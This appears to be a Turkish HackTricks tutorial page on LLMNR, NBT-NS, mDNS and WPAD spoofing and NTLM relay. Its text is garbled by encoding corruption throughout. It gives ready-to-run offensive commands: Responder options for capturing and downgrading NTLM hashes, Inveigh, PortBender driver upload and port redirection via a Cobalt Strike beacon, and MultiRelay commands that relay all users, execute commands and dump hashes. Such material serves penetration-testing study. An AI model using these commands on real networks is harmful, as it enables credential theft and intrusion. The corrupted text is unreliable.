# Spoofing LLMNR, NBT-NS, mDNS/DNS ve WPAD ve Relay SaldÄ±rÄ±larÄ±

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## AÄŸ Protokolleri

### Yerel Ana Bilgisayar Ã‡Ã¶zÃ¼mleme Protokolleri
- **LLMNR, NBT-NS ve mDNS**:
- Microsoft ve diÄŸer iÅŸletim sistemleri, DNS baÅŸarÄ±sÄ±z olduÄŸunda yerel ad Ã§Ã¶zÃ¼mlemesi iÃ§in LLMNR ve NBT-NS kullanÄ±r. Benzer ÅŸekilde, Apple ve Linux sistemleri mDNS kullanÄ±r.
- Bu protokoller, UDP Ã¼zerinden kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ, yayÄ±n doÄŸasÄ± nedeniyle dinleme ve sahtecilik saldÄ±rÄ±larÄ±na aÃ§Ä±ktÄ±r.
- [Responder](https://github.com/lgandx/Responder), bu protokolleri sorgulayan ana bilgisayarlara sahte yanÄ±tlar gÃ¶ndererek hizmetleri taklit etmek iÃ§in kullanÄ±labilir.
- Responder kullanarak hizmet taklitine dair daha fazla bilgi [burada](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) bulunabilir.

### Web Proxy Otomatik KeÅŸif ProtokolÃ¼ (WPAD)
- WPAD, tarayÄ±cÄ±larÄ±n proxy ayarlarÄ±nÄ± otomatik olarak keÅŸfetmesine olanak tanÄ±r.
- KeÅŸif, DHCP, DNS veya DNS baÅŸarÄ±sÄ±z olursa LLMNR ve NBT-NS'ye geri dÃ¶nerek gerÃ§ekleÅŸtirilir.
- Responder, WPAD saldÄ±rÄ±larÄ±nÄ± otomatikleÅŸtirerek istemcileri kÃ¶tÃ¼ niyetli WPAD sunucularÄ±na yÃ¶nlendirebilir.

### Protokol Zehirleme iÃ§in Responder
- **Responder**, LLMNR, NBT-NS ve mDNS sorgularÄ±nÄ± zehirlemek iÃ§in kullanÄ±lan bir araÃ§tÄ±r, sorgu tÃ¼rlerine gÃ¶re seÃ§ici yanÄ±t vererek, esas olarak SMB hizmetlerini hedef alÄ±r.
- Kali Linux'ta Ã¶nceden yÃ¼klenmiÅŸtir, `/etc/responder/Responder.conf` dosyasÄ±nda yapÄ±landÄ±rÄ±labilir.
- Responder, yakalanan hash'leri ekranda gÃ¶sterir ve `/usr/share/responder/logs` dizinine kaydeder.
- Hem IPv4 hem de IPv6'yÄ± destekler.
- Responder'Ä±n Windows sÃ¼rÃ¼mÃ¼ [burada](https://github.com/lgandx/Responder-Windows) mevcuttur.

#### Responder'Ä± Ã‡alÄ±ÅŸtÄ±rma
- VarsayÄ±lan ayarlarla Responder'Ä± Ã§alÄ±ÅŸtÄ±rmak iÃ§in: `responder -I <Interface>`
- Daha agresif sorgulama iÃ§in (potansiyel yan etkilerle birlikte): `responder -I <Interface> -P -r -v`
- NTLMv1 zorluklarÄ±/yanÄ±tlarÄ±nÄ± daha kolay kÄ±rmak iÃ§in yakalamak iÃ§in teknikler: `responder -I <Interface> --lm --disable-ess`
- WPAD taklitini etkinleÅŸtirmek iÃ§in: `responder -I <Interface> --wpad`
- NetBIOS istekleri saldÄ±rganÄ±n IP'sine Ã§Ã¶zÃ¼lebilir ve bir kimlik doÄŸrulama proxy'si kurulabilir: `responder.py -I <interface> -Pv`

### Responder ile DHCP Zehirleme
- DHCP yanÄ±tlarÄ±nÄ± sahtelemek, bir kurbanÄ±n yÃ¶nlendirme bilgilerini kalÄ±cÄ± olarak zehirleyebilir ve ARP zehirlemesine gÃ¶re daha gizli bir alternatif sunar.
- Hedef aÄŸÄ±n yapÄ±landÄ±rmasÄ± hakkÄ±nda kesin bilgi gerektirir.
- SaldÄ±rÄ±yÄ± Ã§alÄ±ÅŸtÄ±rma: `./Responder.py -I eth0 -Pdv`
- Bu yÃ¶ntem, NTLMv1/2 hash'lerini etkili bir ÅŸekilde yakalayabilir, ancak aÄŸ kesintisini Ã¶nlemek iÃ§in dikkatli bir ÅŸekilde ele alÄ±nmalÄ±dÄ±r.

### Responder ile Kimlik Bilgilerini Yakalama
- Responder, yukarÄ±da belirtilen protokolleri kullanarak hizmetleri taklit edecek ve bir kullanÄ±cÄ± sahte hizmetlere karÅŸÄ± kimlik doÄŸrulama yapmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda kimlik bilgilerini (genellikle NTLMv2 Zorluk/YanÄ±t) yakalayacaktÄ±r.
- Daha kolay kimlik bilgisi kÄ±rma iÃ§in NetNTLMv1'e dÃ¼ÅŸÃ¼rme veya ESS'yi devre dÄ±ÅŸÄ± bÄ±rakma giriÅŸimleri yapÄ±labilir.

Bu tekniklerin yasal ve etik bir ÅŸekilde uygulanmasÄ±, uygun yetkilendirme saÄŸlanmasÄ± ve kesinti veya yetkisiz eriÅŸimden kaÃ§Ä±nÄ±lmasÄ± Ã¶nemlidir.

## Inveigh

Inveigh, Windows sistemleri iÃ§in tasarlanmÄ±ÅŸ bir penetrasyon test cihazÄ± ve kÄ±rmÄ±zÄ± takÄ±m aracÄ±. Responder ile benzer iÅŸlevler sunarak sahtecilik ve adam ortada saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirir. AraÃ§, bir PowerShell betiÄŸinden C# ikili dosyasÄ±na evrim geÃ§irmiÅŸtir ve [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) ve [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) ana sÃ¼rÃ¼mleridir. AyrÄ±ntÄ±lÄ± parametreler ve talimatlar [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) sayfasÄ±nda bulunabilir.

Inveigh, PowerShell Ã¼zerinden Ã§alÄ±ÅŸtÄ±rÄ±labilir:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Veya bir C# ikili dosyasÄ± olarak Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Bu saldÄ±rÄ±, hedef makineye eriÅŸim saÄŸlamak iÃ§in SMB kimlik doÄŸrulama oturumlarÄ±nÄ± kullanÄ±r ve baÅŸarÄ±lÄ± olursa bir sistem kabuÄŸu verir. Ana gereksinimler ÅŸunlardÄ±r:
- Kimlik doÄŸrulayan kullanÄ±cÄ±nÄ±n, yÃ¶nlendirilmiÅŸ ana makinede Yerel YÃ¶netici eriÅŸimine sahip olmasÄ± gerekir.
- SMB imzalama devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r.

#### 445 Port YÃ¶nlendirme ve TÃ¼nelleme

DoÄŸrudan aÄŸ tanÄ±tÄ±mÄ±nÄ±n mÃ¼mkÃ¼n olmadÄ±ÄŸÄ± senaryolarda, 445 numaralÄ± porttaki trafik yÃ¶nlendirilip tÃ¼nellenmelidir. [**PortBender**](https://github.com/praetorian-inc/PortBender) gibi araÃ§lar, yerel yÃ¶netici eriÅŸimi mevcut olduÄŸunda sÃ¼rÃ¼cÃ¼ yÃ¼kleme iÃ§in gerekli olan 445 numaralÄ± port trafiÄŸini baÅŸka bir porta yÃ¶nlendirmeye yardÄ±mcÄ± olur.

PortBender kurulumu ve Cobalt Strike'daki Ã§alÄ±ÅŸmasÄ±:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM Relay SaldÄ±rÄ±larÄ± iÃ§in DiÄŸer AraÃ§lar

- **Metasploit**: Proxylere, yerel ve uzak ana bilgisayar detaylarÄ±na gÃ¶re ayarlanÄ±r.
- **smbrelayx**: SMB oturumlarÄ±nÄ± iletmek ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak veya arka kapÄ±lar daÄŸÄ±tmak iÃ§in bir Python betiÄŸi.
- **MultiRelay**: Belirli kullanÄ±cÄ±larÄ± veya tÃ¼m kullanÄ±cÄ±larÄ± iletmek, komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak veya hash'leri dÃ¶kmek iÃ§in Responder paketinden bir araÃ§.

Her araÃ§, gerekirse bir SOCKS proxy Ã¼zerinden Ã§alÄ±ÅŸacak ÅŸekilde yapÄ±landÄ±rÄ±labilir, dolaylÄ± aÄŸ eriÅŸimi ile bile saldÄ±rÄ±lara olanak tanÄ±r.

### MultiRelay Ä°ÅŸlemi

MultiRelay, belirli IP'leri veya kullanÄ±cÄ±larÄ± hedef alarak _**/usr/share/responder/tools**_ dizininden Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Bu araÃ§lar ve teknikler, Ã§eÅŸitli aÄŸ ortamlarÄ±nda NTLM Relay saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in kapsamlÄ± bir set oluÅŸturur.

### NTLM GiriÅŸlerini Zorla

Windows'ta **bazÄ± ayrÄ±calÄ±klÄ± hesaplarÄ±n rastgele makinelere kimlik doÄŸrulamasÄ± yapmasÄ±nÄ± zorlayabilirsiniz**. NasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± okuyun:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Referanslar
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
